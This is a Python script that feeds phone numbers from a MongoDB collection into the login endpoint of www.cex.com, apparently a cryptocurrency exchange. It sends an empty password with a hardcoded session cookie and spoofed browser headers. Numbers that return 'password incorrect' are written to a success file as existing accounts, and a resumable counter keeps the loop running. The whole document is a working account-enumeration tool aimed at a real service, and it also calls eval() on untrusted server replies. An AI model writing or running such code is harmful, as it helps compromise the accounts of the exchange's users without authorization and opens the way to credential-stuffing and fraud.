# coding:utf-8
import requests
from number_mongo import number_BaFangZiYuan


def check_number(number):
    headers = {'Host': 'www.cex.com', 'Connection': 'keep-alive', 'Content-Length': '55', 'Pragma': 'no-cache',
               'Cache-Control': 'no-cache', 'Accept': '*/*', 'Origin': 'https://www.cex.com',
               'X-Requested-With': 'XMLHttpRequest',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Referer': 'https://www.cex.com/Login/index', 'Accept-Encoding': 'gzip, deflate, br',
               'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': 'acw_tc=AQAAAMal5l/WcwUAuVARcOAFi4Slqx54; language=zh-CN; PHPSESSID=7u77nu2embjp578luhfr6486f5; __lnkrntdmcvrd=-1'}
    url = "https://www.cex.com/Login/checkLog.html"
    form_data = [('account', str(number)),
                 ('pwd', ""),
                 ('captcha', ""),
                 ('checkbox', "on"),
                 ]
    page = requests.post(url, headers=headers, data=form_data).text
    print(eval(page))
    return eval(page)


def save_success_number(number):
    with open("success_币久网海外.txt", "a+")as f:
        f.write(str(number) + "\n")


def save_faile_number(number):
    with open("faile_币久网海外.txt", "a+")as f:
        f.write(str(number) + "\n")


if __name__ == "__main__":
    count = 0
    while True:
        try:
            with open("flag_币久网海外.txt")as f:
                count = int(f.read())
            for res in number_BaFangZiYuan.find({'_id': count}):
                line = res["number"].replace("\n", "")
                print(line, count)
                count += 1
                result = check_number(line)
                if str(result).find("密码输入错误") != -1:
                    save_success_number(number=line)
                else:
                    save_faile_number(number=line)
            with open("flag_币久网海外.txt", "w")as f:
                f.write(str(count))
        except:
            pass

# {'info': '邮箱或者手机不存在', 'status': 0, 'url': ''}
# {'info': '密码验证成功', 'status': 1, 'url': 'Login\\/login_verify'}
# {'info': '密码输入错误', 'status': 0, 'url': ''}
